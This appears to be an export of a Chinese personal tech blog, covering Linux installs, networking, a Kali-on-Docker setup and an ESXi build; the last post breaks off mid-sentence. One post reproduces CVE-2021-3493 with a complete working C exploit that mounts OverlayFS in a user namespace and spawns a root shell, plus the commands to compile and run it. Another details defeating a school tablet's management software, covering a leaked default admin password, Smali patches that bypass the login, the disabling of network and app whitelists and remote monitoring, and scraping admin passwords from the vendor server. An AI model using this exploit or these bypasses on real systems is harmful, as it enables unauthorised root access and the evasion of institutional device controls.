[{"title":"Ubuntu内核提权漏洞复现(CVE-2021-3493)","url":"http://example.com/2021/05/27/Ubuntu内核提权漏洞复现-CVE-2021-3493/","content":"简介OverlayFS 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统，Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限\n影响版本Ubuntu 20.10\nUbuntu 20.04 LTS\nUbuntu 18.04 LTS\nUbuntu 16.04 LTS\nUbuntu 14.04 ESM\nLinux Kernel &lt;  5.11\n环境搭建下载\nhttp:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;ubuntu-20.04.1-desktop-amd64.iso\n\n利用过程检查内核版本内核版本需要小于5.11\n\nEXP#define _GNU_SOURCE\n#include &lt;stdio.h>\n#include &lt;stdlib.h>\n#include &lt;string.h>\n#include &lt;unistd.h>\n#include &lt;fcntl.h>\n#include &lt;err.h>\n#include &lt;errno.h>\n#include &lt;sched.h>\n#include &lt;sys/types.h>\n#include &lt;sys/stat.h>\n#include &lt;sys/wait.h>\n#include &lt;sys/mount.h>\n\n//#include &lt;attr/xattr.h>\n//#include &lt;sys/xattr.h>\nint setxattr(const char *path, const char *name, const void *value, size_t size, int flags);\n\n\n#define DIR_BASE    \"./ovlcap\"\n#define DIR_WORK    DIR_BASE \"/work\"\n#define DIR_LOWER   DIR_BASE \"/lower\"\n#define DIR_UPPER   DIR_BASE \"/upper\"\n#define DIR_MERGE   DIR_BASE \"/merge\"\n#define BIN_MERGE   DIR_MERGE \"/magic\"\n#define BIN_UPPER   DIR_UPPER \"/magic\"\n\n\nstatic void xmkdir(const char *path, mode_t mode)\n&#123;\n    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)\n        err(1, \"mkdir %s\", path);\n&#125;\n\nstatic void xwritefile(const char *path, const char *data)\n&#123;\n    int fd = open(path, O_WRONLY);\n    if (fd == -1)\n        err(1, \"open %s\", path);\n    ssize_t len = (ssize_t) strlen(data);\n    if (write(fd, data, len) != len)\n        err(1, \"write %s\", path);\n    close(fd);\n&#125;\n\nstatic void xcopyfile(const char *src, const char *dst, mode_t mode)\n&#123;\n    int fi, fo;\n\n    if ((fi = open(src, O_RDONLY)) == -1)\n        err(1, \"open %s\", src);\n    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)\n        err(1, \"open %s\", dst);\n\n    char buf[4096];\n    ssize_t rd, wr;\n\n    for (;;) &#123;\n        rd = read(fi, buf, sizeof(buf));\n        if (rd == 0) &#123;\n            break;\n        &#125; else if (rd == -1) &#123;\n            if (errno == EINTR)\n                continue;\n            err(1, \"read %s\", src);\n        &#125;\n\n        char *p = buf;\n        while (rd > 0) &#123;\n            wr = write(fo, p, rd);\n            if (wr == -1) &#123;\n                if (errno == EINTR)\n                    continue;\n                err(1, \"write %s\", dst);\n            &#125;\n            p += wr;\n            rd -= wr;\n        &#125;\n    &#125;\n\n    close(fi);\n    close(fo);\n&#125;\n\nstatic int exploit()\n&#123;\n    char buf[4096];\n\n    sprintf(buf, \"rm -rf '%s/'\", DIR_BASE);\n    system(buf);\n\n    xmkdir(DIR_BASE, 0777);\n    xmkdir(DIR_WORK,  0777);\n    xmkdir(DIR_LOWER, 0777);\n    xmkdir(DIR_UPPER, 0777);\n    xmkdir(DIR_MERGE, 0777);\n\n    uid_t uid = getuid();\n    gid_t gid = getgid();\n\n    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)\n        err(1, \"unshare\");\n\n    xwritefile(\"/proc/self/setgroups\", \"deny\");\n\n    sprintf(buf, \"0 %d 1\", uid);\n    xwritefile(\"/proc/self/uid_map\", buf);\n\n    sprintf(buf, \"0 %d 1\", gid);\n    xwritefile(\"/proc/self/gid_map\", buf);\n\n    sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK);\n    if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1)\n        err(1, \"mount %s\", DIR_MERGE);\n\n    // all+ep\n    char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\";\n\n    xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777);\n    if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1)\n        err(1, \"setxattr %s\", BIN_MERGE);\n\n    return 0;\n&#125;\n\nint main(int argc, char *argv[])\n&#123;\n    if (strstr(argv[0], \"magic\") || (argc > 1 &amp;&amp; !strcmp(argv[1], \"shell\"))) &#123;\n        setuid(0);\n        setgid(0);\n        execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL);\n        err(1, \"execl /bin/bash\");\n    &#125;\n\n    pid_t child = fork();\n    if (child == -1)\n        err(1, \"fork\");\n\n    if (child == 0) &#123;\n        _exit(exploit());\n    &#125; else &#123;\n        waitpid(child, NULL, 0);\n    &#125;\n\n    execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL);\n    err(1, \"execl %s\", BIN_UPPER);\n&#125;\n\n利用把源码放入Ubuntu后，使用gcc编译得到二进制文件：\ngcc exploit.c -o exploit\n\n添加执行权限：\nchmod +x exploit\n\n执行文件提权：\n./exploit\n\n\n","categories":["漏洞复现"],"tags":["Linux提权","CVE"]},{"title":"Arch Linux安装笔记","url":"http://example.com/2021/05/18/Arch-Linux安装笔记/","content":"前言虽然macOS属于类Unix系统，但是有许多操作还是要在Linux上操作，比如编译Linux或着运行一些没有移植到macOS的应用，于是就产生了安装一个Linux系统的需求，而如果安装macOS+Linux多系统的话，驱动和切换系统都比较麻烦，所以我选择安装一个Linux的虚拟机。\n发行版选择这一次安装我打算安装Arch Linux，这个发行版拥有极为强大的包管理器、拥有详细的Wiki以及强大的社区支持，同时具有可高度定制安装的特点，是一个非常适合开发者的发行版。至于为什么不用Ubuntu或者CentOS呢？想换个口味 这些发行版并不具有以上特性。\n\n\n\n\n\n安装环境平台：macOS 11.3.1 x86_64 with VMWare Fusion 12.1.1系统：Arch Linux 2021.04.01 x86_64\n安装过程Arch Linux不同于其他发行版，前者并没有提供图形或类图形化的安装界面，需要使用命令进行安装。\n新建虚拟机VMWare新建虚拟机时可以选择 Other Linux 5.x and later kernel 64-bit 并在启动方式选择UEFI模式启动\n\n\n\n\n\n\n\n\n\n\n之后将CD/ROM指向的光驱文件指向ArchLinux的安装镜像即可\n开始安装指定镜像分配资源之后就能启动虚拟机开始安装了  \n启动虚拟机之后就可以进入Arch的live系统，live系统是一个不包含图形界面的系统，我们需要在上面用命令完成安装的每一个步骤：分区，安装内核，配置系统。  \n\n\n安装界面\n\n\n进入live系统之后首先需要查看当前启动方式是否为UEFI：\nls /sys/firmware/efi/efivars\n\n如果没有异常地显示了目录则是以UEFI模式启动，之后就可以配置时间：\ntimedatectl set-ntp true\n\n设置成功后就可以进行分区操作，首先列出当前的磁盘：\nfdisk -l\n\n\n\n\n\n\n得到我们的主硬盘是sda，之后可以使用cfdisk进行分区：\ncfdisk /dev/sda\n\n进入cfdisk后选择GPT，由于我们使用的是UEFI分区，所以需要创建一个至少为260MB的UEFI分区，然后剩下的空间分成Linux Filesystem，注意，如果分配给虚拟机的内存较小就还需要额外分出一个分区作为swap。\n分区完成后就能进行格式化分区并挂载\nmkfs.ext4 /dev/sda1 #这是根目录分区\nmkswap /dev/sdax #这是交换分区（如果存在）\nmkfs.vfat /dev/sda0 #这是UEFI分区\nmount /dev/sda1 /mnt #挂载根目录分区\nmkdir -p /mnt/boot/EFI #创建UEFI目录\nmount /dev/sda0 /mnt/boot/EFI #挂载UEFI分区到目录\n\n挂载分区完成后，我们就可以将系统安装到目录下了，在安装之前，可以先指定国内源提高下载速度：\n将  \nServer &#x3D; http:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;archlinux&#x2F;$reop&#x2F;os&#x2F;$arch    \nServer &#x3D; http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;archlinux&#x2F;$reop&#x2F;os&#x2F;$arch\n\n添加到 /etc/pacman.d/mirrorlist文件的第一行，然后进行安装：\npacstrap /mnt base linux linux-firmware\n\n之后就可以耐心等待安装完成（取决于网速）\n\n\n安装完成\n\n\n安装完成后需要生成fstab文件：\ngenfstab -U /mnt >> /mnt/etc/fstab\n\n生成fstab文件之后就能直接进入安装好系统的Shell了：\narch-chroot /mnt\n\n\n\n安装完成\n\n\n安装完成后，就要开始进行一系列配置了。\n首先设置时区：\nln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n\nhwclock --systohc\n\n安装vim，dhcp客户端，sudo：\npacman -S vim dhcpcd sudo\n\n创建host文件：  \nmyhostname为自己想设置的主机名\necho \"myhostname\" >> /etc/hostname\n\n添加hosts：\nvim /etc/hosts\n\n在里面输入：\n127.0.0.1   localhost\n::1     localhost\n127.0.1.1   myhostname.localdomain  myhostname\n\n注意myhostname是刚刚设置的主机名\n然后修改root用户密码：\npasswd root\n\n设置sudo：\nvim /etc/sudoers\n\n把 %wheel 那行前面的#去掉\n新建用户：\nuseradd -m -g wheel 用户名 &amp;&amp; passwd 用户名\n\n设置grub：\npacman -S grub efibootmgr dosfstools ntfs-3g os-prober\ngrub-install --target=x86_64-efi --efi-directory=/boot/EFI --bootloader-id=ArchLinux\ngrub-mkconfig -o /boot/grub/grub.cfg\n\n设置完成后即可退出并重启：\nexit\numount -R /mnt\nreboot\n\n于是系统安装完毕。\n系统后期配置安装必要驱动首先我们需要安装vmwaretool以及vm的显卡驱动。\n安装vmwaretools和gtkmm：\npacman -S open-vm-tools gtkmm\n\n配置服务：\ncat /proc/version > /etc/arch-release\nsystemctl start vmtoolsd\nsystemctl enable vmtoolsd\n\n安装vm显卡驱动：\npacman -S extra/xf86-video-vmware\n\n安装KDE图形界面(需要在非root下操作)\n首先需要设置软件源：\nsudo vim /etc/pacman.d/mirrorlist\n\n把国内的速度快的源放在第一行\nsudo vim /etc/pacman.conf\n\n把multilib和它下面一行的 # 去掉，具体是把光标移到 # 那，按 x ，然后在文件里添加 archlinuxcn 源，按 i 输入\n[archlinuxcn]\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch\n\n然后进行更新：\nsudo pacman -Syu\n\n生成keyring：\nsudo pacman -Syu haveged\nsystemctl start haveged\nsystemctl enable haveged\nrm -rf /etc/pacman.d/gnupg\nsudo pacman-key --init\nsudo pacman-key --populate archlinux\nsudo pacman-key --populate archlinuxcn\nsudo pacman -S archlinuxcn-keyring\n\n安装xorg：\npacman -S xorg xorg-server\n\n安装输入设备：\nsudo pacman -S xf86-input-libinput\nsudo pacman -S xf86-input-synaptics  #触摸板驱动#\n\n安装登录管理器：\nsudo pacman -S sddm sddm-kcm\nsystemctl enable sddm\n\n安装KDE：\nsudo pacman -S plasma kde-applications\n\n安装声音管理器：\nsudo pacman -S alsa-utils pulseaudio pulseaudio-alsa\n\n安装完成后重启即可，效果图如下：\n\n\n\n\n\n后续安装软件可能会用到Aur助手：\nsudo pacman -S yay\n\n至此，Archlinux安装已经完成。EOF\n","categories":["Notes"],"tags":["Linux"]},{"title":"CentOS8下开启L2TP后Firewalld失效的解决方法","url":"http://example.com/2021/04/10/CentOS8下开启L2TP后Firewalld失效的解决方法/","content":"起因最近开始上数据库原理与应用，需要用到SQL，而我主要使用macOS进行日常操作。不同于Windows，macOS上搭建SQL Server需要借助docker，而macOS Arm版本的Docker仍属于测试版，有许多不稳定的因素，于是打算在我的服务器上部署ms-sqlserver。但是微软并未对Ubuntu 20.04发布ms-sqlserver对release，docker上的ms-sqlserver也有许多莫名其妙的bug，于是我计划将我的服务器迁移到CentOS 8上（49年入国军），顺便体验和学习CentOS。\n迁移总体上很顺利，原来运行在Ubuntu上的Shadowsocks和L2TP服务端以及其他服务和环境都十分顺利的迁移到CentOS上了，ms-sqlserver也安装成功。但是后续的操作却出现了一些exception。\nCentOS相比Ubuntu有一个很显著的区别是自带了防火墙，每安装一个服务都需要将对应的端口设为ACCEPT。但是在安装好L2TP服务后，我尝试在防火墙添加端口，却提示 FirewallD is not running 。\n环境CentOS 8.3.2011 x86_64\n解决过程既然Firewalld没有在运行，先看看这个服务的状态：\n\n于是使用systemctl unmask firewalld.service  \n再systemctl start firewalld.service\n发现服务成功启用，firewall-cmd指令也成功被执行，于是以为问题被解决。\n后来发现系统重启之后，从学校内网无法正常使用L2TP服务器：能顺利连接并获得VPN内网IP，但是无法访问VPN IP外的其他地址，初步推测是转发环节出了问题。\n我是使用wget https://git.io/vpnsetup-centos -O vpn.sh &amp;&amp; sudo sh vpn.sh &amp;&amp; sudo bash /opt/src/ikev2.sh --auto这个脚本一键部署l2TP/IPSec服务，出了问题自然首先重新执行一次脚本，重新执行后发现L2TP连接回归正常，但是Firewalld又失效了，于是开始解析脚本。\n在脚本中发现了相关操作\n\n\n\n不难发现脚本将相关的转发操作部署在nftables里面，然后将firewalld给mask了，而ntfables的操作比firewalld复杂得多，经过短时间的研究，大概了解到可以通过nft insert rule inet firewalld filter_IN_public_allow &#123;protol&#125; dport &#123;port&#125; accept\n或\nnft insert rule inet firewalld filter_INPUT &#123;protol&#125; dport &#123;port&#125; accept\n来将端口设置为ACCEPT，并通过\nnft list ruleset inet\n来查看已经开放的端口。\n目前还不知道怎样通过firewalld来实现L2TP的转发，有知道的朋友欢迎在评论区留言。\nEOF\n","categories":["Notes"],"tags":["Linux","运维"]},{"title":"记一次解除某平板管理软件的限制","url":"http://example.com/2021/03/28/记一次解除某平板管理软件的限制/","content":"前言大部分采用智慧课堂教学的学校都是用某平板管理软件进行对平板的管控，能实现限制网络连接，限制APP的安装，实时获取设备信息等。这里将会介绍解除平板管控的一些已经验证过可用的思路。这是一个两年半之前实施的项目,因为一些数据丢失的原因这里无法进行整个系统的环境复现，也没有太多成果截图，这里只能根据好友共享的系统镜像最大限度地还原当时的思路。\n环境概述拿到平板之后，简单的测试了一下，发现许多可以利用的点：\n\n平板采用高度定制的安卓7.1.1系统\n平板使用验证APK包名的方法来判断是否属于白名单\n平板的网络防火墙并未限制192.168.0.0/16以及172.16.0.0/16\n虽然系统将USB设置为仅充电但是在系统开机加载时有短暂的几秒能使用ADB\nBootloader可被解锁\n存在一个“管理员设置”并由密码保护，密码可能随云端更新\n平板管理始终没有调用ROOT权限\n\n准备工作为了更加透彻地了解这个系统，我利用短暂的ADB进入bootloader并解锁bootloader，然后刷入TWRP，将系统的镜像提取了出来，检视应用列表后发现，对平板的限制极有可能是由包名为com.android.launcher3的定制桌面操控，于是开始整活。\n解除过程尝试卸载桌面既然是有可能由桌面操控，那么卸载掉桌面极有可能会解除管控，对桌面使用dex2jar进行简单逆向，发现在设备从未联网时，管理员默认密码为xunfei!!@，于是在bootloader双清设备，启动系统，断网并进入管理员登录界面，输入默认密码成功进入管理员界面，管理员界面功能如下：\n\n\n源码中的默认密码\n\n\n\n\n管理员设置界面\n\n\n虽然那个解除限制十分诱人，但是后期的逆向发现这是对平板使用限制的解除而非App或TCP/IP的限制。回到正题，我们打开usb连接电脑，并连接电脑，顺利进入adb调试界面，于是执行adb uninstall com.android.launcher3以及adb install newdesk.apk，完成后重启设备，由于其内置的部分App有内嵌Web访问以访问登录或重置密码的网页，我们可以使用ARP劫持使其强行访问我们指定的网站，测试结果发现卸载com.android.launcher3后，网址白名单已被解除，然而App的安装限制仍未解除，这更加印证了com.android.launcher3对平板的限制有着千丝万缕的联系。也意味着我们需要进行进一步的逆向。\n\n\n卸载桌面并使用ARP劫持后成功访问白名单外的网页\n\n\n攻破管理员登录从前面的研究结果来看，管理员界面是一个极为关键的跳板，如果能绕过管理员界面或得到密码将会对后面对操作有极大的帮助，于是开始审阅源码。在逆向出来的jar包里，很容易发现一个名为LoginActivity的类控制着管理员登录界面，得到了登录相关的方法\n\n\n登录方法的Java源码\n\n\n显然我们可以修改源文件以将“用户名且密码正确”的逻辑改成“用户名或密码正确”或者“用户名正确且密码错误”以达到输入任意值即可进入管理员界面。但是我们并不能直接编辑dex2jar得到的java文件，我们需要更深一层，通过对照java源代码去编辑Smali文件，好在Smali语言不算特别难理解，很快发现逻辑判断的地方，如图：\n\n\n判断逻辑的Smali代码解析\n\n\n于是，我们可以把密码判断的if-eqz替换成if-nez，这样如果用户输入错误的密码就不跳转，进行登录成功的流程，不仅如此，我们可以更进一步，在line 104中调用sPFTool来读取管理员密码时插入一个弹窗，把密码值通过弹窗弹出来，在move-result-object v1后面插入如下代码：\n\nconst/4 v5, 0x1\ninvoke-static &#123;p0, v1, v5&#125;, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\nmove-result-object v4\ninvoke-virtual &#123;v4&#125;, Landroid/widget/Toast;->show()V\n\n\n即可在登录中程序调用密码时将密码弹出来，由于我使用的是早期版本的平板管理软件，密码直接以明文方式存储，十分方便进行hook，而后续版本则存储了密码的MD5，但是实验表明这段MD5并没有使用任何数据加salt，对其进行解密难度不是特别大。\n网址白名单的解除虽然管理员界面有方法添加网址白名单，但是只能一个一个网址地添加而且有被服务端配置覆盖的风险，自然不可取，而前文提到卸载平板管理软件后重启系统网址白名单即解除，那么可以推出在设备开机之后平板管理手动启动了网址白名单，至少有一个管理开机后的操作或者初始化的类包含了白名单的开关，于是我们继续逆向，发现一个叫“BootCheckReceiver”类操控着开机启动后的操作，在里面发现了相关方法，Java代码如下：\n\n\n\n\n\n这段代码十分好理解，读取配置如果为limit则启用防火墙，我们自然不会去修改可能被服务端覆盖的配置来达到效果，而enableFireWall前面名为“MDM”的类引起了我的注意，根据import的索引，我跳转到这个类，发现是一个根据设备型号进行类索引的“中枢”，而我手上的平板对应的类如下：\n\n\n\n\n\n于是我们前往这个类，发现许多有意思的方法，这里列举一部分：\n\n\nDDDD\n\n\n于是我们现在前往BootCheckReceiver对应的Smali文件，找到了对enableFirewall的调用：\n.line 51\nsget-object v1, Lcom/linspirer/rom/MDM;->x:Lcom/linspirer/rom/IMDM;\ninvoke-interface &#123; v1 &#125;, Lcom/linspirer/rom/IMDM;->enableFireWall()\n\n直接把enable修改成disable即可，至此，网络访问限制已被解除。\nMDM.x的第三方调用我们已经大致了解了平板管控的原理，定制的系统提供API，平板管理软件通过MDM.x的方法与API对接，而在调用API时并未发现任何验证措施，如果我们自己写一个安卓APP，引入MDM相关的类和方法，是否也可以调用系统提供的API呢？\n答案是肯定的，如果有安卓APP开发基础，我们可以直接将与MDM调用API有关联的类导入到自己的APP，做好索引后即可使用MDM.x.调用系统API；如果不会开发相关APP，我们可以在平板管理里找到一个有交互性且调用了MDM类的Activity，比如管理员设置。\n我们可以直接前往管理员设置所对应的Smali文件，将已存在的方法调用替换成对MDM.x的调用，比如：\n\n\n管理员设置中的MDM调用\n\n\n可以替换成enableSDCard之类的方法。\n应用白名单的解除虽然我从MDM的类中挖出了绝大部分的控制方法，但是遍历后并没有发现有解除app白名单方法，仅有写入或读取，由此可见这个公司还是比较保守，没有把如此关键的方法放出来，初步猜测这个方法位于PackageManagerService中但是目前没有办法逆向出来，于是逆向了framework里面的PackageInstaller和pm，并没有发现白名单的实现机制，于是只能从逻辑推测。\n首先回顾一下系统逻辑，如果存在不在白名单内的非system应用，会被平板管理卸载掉，而平板管理和智慧课堂套件都不是system应用，并且在平板管理里面有一些方法将自身和智慧课堂套件写入白名单，于是可以推测当白名单为空的时候，应该不存在限制，否则当白名单为空时，平板管理等一系列附属APP将会被系统卸载，平板管理被卸载后就无法从云端读取新的白名单写入系统，平板就此报废。于是我在上面调用MDMAPI的app中新增了一个功能：利用MDM.x.appWhiteListWrite()写入一个空的名单，然后利用修改包名将这个APP改成白名单内存在的app，装入系统，运行方法，限制顺利被解除，之后进一步修改源码，将平板管理内所有调用MDM.x.appWhiteListWrite()的方法的赋值替换为空值，防止平板管理写入白名单导致限制被重新启用，至此应用白名单已被解除。\n\n\n把MDM相关的类导入到自己的APP就能直接调用了\n\n\n解除云端监控之前有一部分的平板出现系统故障，上报学校网管之后被后台远程重置，于是推测系统内有服务器远程操控的方法，于是继续阅读源码。在一个叫CommandManager.class的类里面找到了一个服务器发送命令让本地执行的方法，于是在Smali将命令改成服务器基本不会发送的字符串，这样就大致脱离了服务端对平板的控制。\n\n\n远程操控的相关类\n\n\n顺着上传应用列表的方法，在其他类中找到了自动上传位置和应用列表的类，于是在Smali中将将要上传的返回值用空白变量劫持，这样就大致脱离了服务器对设备的监控。\n伪装成客户端从服务器爬数据前文提到管理员密码等配置会随服务器更新，于是我找到了这个类，我们可以依照上面调用MDM.x的思路，在第三方APP引入这个类及其依赖的类，在输入schoolid等数据之后，即可直接获取管理员密码等关键信息。\n\n\n\n\n\n\n\n解除限制后安装第三方APP以及使用DEX注入劫持背景图\n\n\n总结这个逆向的项目还是非常简单的，目标系统简直是一个筛子。不过后期得到了许多“修复”：  \n\n密码采用MD5存储（源码中的初始密码仍然为明文）\n对源码进行了混淆（源码中内置mapping且有未混淆版本源码做对照）\ncom.android.launcher3不可卸载（可以用pm disable禁用然后用破解版替代）\n\n\n\n\n\n\n\n解除这类平板使用限制的方法还有很多，比如从万能的xda下载机型的官方系统包直接刷入等等，虽然十分简单粗暴，但是却少了许多逆向的乐趣。\nEOF\n","categories":["Notes"],"tags":["逆向","Java","Smali"]},{"title":"使用一条FRP隧道访问多个内网服务","url":"http://example.com/2021/02/22/使用一条frp隧道访问多个内网服务/","content":"前言虽然IPv6正在逐渐普及，可能会有助于用户获得公网IP，但是运营某学校校园网的电信并未打算为该校师生提供IPv6，公网IP更加无从说起，所以目前来说，FRP仍然是生活中非常常用且不可取代的。然而一些FRP服务商的免费服务中提供的隧道十分少，稳定的花生壳只提供了两条隧道，而SakuraFrp虽然提供了5条但是没有前者那么稳定，虽然2-5条隧道也不是不能用，但是对于RDP，SSH，web等一众服务来说是不够的，那么有没有办法仅用一条隧道就访问内网的多个服务呢？\n\n答案是肯定的：我们可以在隧道搭建SOCKS5来实现。  \nSOCKS5是一个代理协议，它在使用TCP/IP协议通讯的前端机器和服务器机器之间扮演一个中介角色，使得内部网中的前端机器变得能够访问Internet网中的服务器，说白了就是当通过FRP连接到SOCKS5服务端后，客户端就相当于直接进入服务端所在的内网了。\n部署服务端环境系统：Ubuntu Server 20.04.2 LTS\n安装Shadowsocks服务端在Ubuntu下可以通过Nodejs快速部署Shadowsocks服务端，首先安装Nodejs和npm：\nsudo apt update\nsudo apt install nodejs npm\n\n安装pm2:\nnpm -g i pm2\n\n安装shadowsocks：\nnpm -g i shadowsocks\n\n此时应该会提示安装路径，如/usr/local/lib/node_modules/shadowsocks/config.json\n用Vim打开这个配置文件，如果这个文件是空的就写入如下信息：\n&#123;\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8083,\n    \"local_address\":\"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"myPassword\",\n    \"timeout\":600,\n    \"method\":\"aes-256-cfb\"\n&#125;\n\n易知访问端口为8083，密码为myPassword，算法为aes-256-cfb，此时应该设置一个能抵御社工的强密码，否则黑客将能轻易地通过简单密码进入内网！\n部署完成后，可以启动服务：\npm2 start /usr/local/lib/node_modules/shadowsocks/bin/ssserver\n\n但是这样部署并不能开机自启，我们可以通过systemd来实现：\n首先新建一个服务并编辑：\nsudo vim /etc/systemd/system/ss.service\n\n输入以下内容\n[Unit]\nDescription=Shadowsocks Client Service \nAfter=network.target \n\n[Service]\nUser=Username\nType=forking\nExecStart=pm2 start /usr/local/lib/node_modules/shadowsocks/bin/ssserver\n\n[Install]\nWantedBy=multi-user.target\n\n其中Username为用户名  \n保存之后启用服务并启动：\nsudo systemctl enable ss.service\nsudo systemctl start ss.service\n\n重启并测试\npm2 ls\n\n如果出现shadowsocks的服务则部署成功\n部署FRP服务部署的客户端及教程在各大服务商都有提供，安装好FRP服务后将本地端口指向上文配置文件中所配置的访问端口即可。值得一提的是，因为某些原因花生壳的SOCKS5隧道仅对付费用户开放，而我们使用内网穿透的场景多为TCP协议为主，所以我们可以新建一条TCP或UDP隧道（取决于实际需求）来指向shadowsocks的端口，SakuraFrp也类似，新建TCP/UDP隧道即可。\n\n\n\n\n\n客户端客户端环境操作系统：iOS/iPad OS 14.5，macOS Big Sur 11.2.1\n客户端部署iOS在非国区商店都能下载Shadowrocket，支持直接在armMac上运行，Windows和安卓可以在各大使用ss协议的机场下载客户端，在客户端中填入FRP的公网地址和端口，密码和算法按照配置文件来填写，启动代理即连接内网。后续可以使用PAC进行进一步操作，这里不再阐述。\n设置HOSTS在上述步骤完成后，虽然理论上已经进入内网，但是仍然无法通过原局域网IP连接对应主机，这时候我们需要在服务端设置hosts：在hosts中输入内网IP 自定义域名（最好选择有代表性且不与广域网的域名重复）如：\n192.168.1.1 a.com\n\n这时候我们在外网使用ss连接，通过a.com即可访问内网中192.168.1.1的主机。通过ping可以发现在SOCKS5的隧道中，各个内网主机的IP被分配了E类IP地址：240.0.0.0-255.255.255.254，而每次连接时各个主机的IP都不一样，目前也没有搞懂这个IP的分配机制，所以就先用hosts来指定IP。\n\n\n在隧道中ping内网主机绑定的域名\n\n\nEOF\n","categories":["Notes"],"tags":["内网穿透","SOCKS5"]},{"title":"在M1 Mac中安装Kali Linux","url":"http://example.com/2021/01/31/在M1-Mac中安装Kali-Linux/","content":"前言虽然此前Parallels Desktop已经发布针对M1芯片的Preview，但是Kali官方并未提供适用于M1芯片的镜像，前者先前发布的ARM架构的Kali Linux多用于树莓派等设备，并不支持在M1和Parallels Desktop中运行，加上有迹象表明M1系列的引导从Boot Camp变成了iBoot，引导第三方系统的难度加大了，所以笔者将尝试从Docker安装Kali Linux。\n\n\n环境设备：MacBook Air (M1,2020)系统：macOS Big Sur 11.1Docker：Docker Desktop Preview 7\n安装首先下载M1版本的Docker Preview  \nhttps://desktop.docker.com/mac/m1preview/Docker-AppleSilicon-Preview7.dmg\n下载并安装好Docker后启动Docker并拉取Kali镜像  \ndocker pull kalilinux/kali-rolling\n\n拉取完成后即可运行Kali容器\ndocker run --name kali -t -i kalilinux/kali-rolling /bin/bash\n\n这是一个类似WSL下的Kali，本身不包含任何工具，需要进行安装\n首先更新apt和安装vim\napt update &amp;&amp; apt install vim\n\n将默认源换成清华源\nvim /etc/apt/sources.list\n\n注释掉默认源，加入以下内容\ndeb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali&#x2F; kali-rolling contrib main non-free\n\ndeb-src http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali&#x2F; kali-rolling contrib main non-free\n安装Kali工具包\napt install kali-linux-default\n\n等待安装即可，大约6GB左右，期间会有多次输入确认。\n运行测试PLATFROM通过输入uname -m 可以看到Docker内运行的是x86_64的Kali Linux,莫非在arm的架构下能模拟x86?\nNMAP从测试的结果来看，常用的nmap无法运行，原因不明，可以从arm的Homebrew下载macOS arm版的nmap进行替代\nabrew install nmap\n\n笔者将arm版homebrew的环境变量设置成了abrew，所以是abrew install。\nSQLMAP正常使用\n\n\nDocker内的Kali无法运行nmap\n\n\n\n\n\n 本地运行nmap\n\n\n\n\n\n运行的是x86_64的Linux\n","categories":["Notes"],"tags":["Linux","macOS","虚拟机"]},{"title":"基于ESXi的All in One主机部署笔记","url":"http://example.com/2021/01/27/基于ESXi的All-in-One主机部署笔记/","content":"前言笔者在学校的网络布局有许多问题，比如H3C-R365路由器功能十分少且不支持OpenWrt之类的开源系统；笔者用作NAS的树莓派I/O性能较差（可能与系统盘是SD卡有关），在千兆局域网下上传速度最多只有30MB/s，会直接影响大文件写入和 Time Machine 备份的效率。基于以上需求，我打算部署一台All in One主机。\n\n\n\n\n\n原先的布局图示\n\n\n\n\n1.底层选择All in One主机即在物理机运行虚拟机底层，然后创建多个虚拟机诸如OpenWrt，Openmediavault，ubuntu等操作系统实现不同服务，不同于别的分布式部署，这些系统都运行在同一台物理机上。\b采用All in One的优点有很多，比如能充分发挥一台服务器的性能，能搭建x86架构的Linux以解决M1 Mac的部分兼容性问题，易于管理等。缺点也十分明显：物理机出现故障会影响整个体系（All in Boom）。\n\n\n\nM1芯片的Mac在搭建博客的时候遇到了兼容性问题\n\n\n\n\n\n当前市面上较为出名的虚拟机底层有Windows提供的HyperV，VMWare提供的ESXi以及开源的Proxmox VE。由于Windows Server系统的稳定性大大不如Linux系列，所以HyperV首先被排除。对比PVE，ESXi拥有操作简便，CPU虚拟化效率高等优点，但是后者硬件兼容性较差，仅原生支持一些服务器级别的硬件，经过多方面的考虑，笔者决定使用ESXi进行部署。\n2.硬件准备十分巧合的是，笔者最近获得了一台其他地方淘汰下来的一台H81-ITX主板的准系统，于是准备用这台机器来部署All in One，配置如下：  \n主板：SOYO-H81-ITXCPU：Intel Celeron G1840 @2.8GHzGPU：CPU集成显卡并预留留一条PCIe x16接口内存：4GB DDR3板载网卡：Realtek RTL8102E 100Mbps电源：机箱内集成120W电源模块并附送60W电源适配器SSD: Sandisk Z400s 128G\n为了能运行更多的虚拟机，笔者直接给机器拓展了一条之前剩余的4G DDR3内存。  \n要想获得好的虚拟机性能少不了硬件直通，而H81主板所支持的1150针系列处理器中只有Core Gen4的部分处理器以及Xeon E3系列支持Intel VT-d^1，而其中支持超线程的CPU中，Xeon E3-1265L v3的功耗十分低（TDP=45W），查阅天梯图可知该处理器性能与E3-1230v2持平，且带有集成显卡，是个十分不错的选择，相比之下E3-1231 v3（没有集成显卡且功耗大）和i7-4790（功耗大且价格昂贵）就逊色多了，于是笔者从淘宝以380元购入了一颗E3-1265L 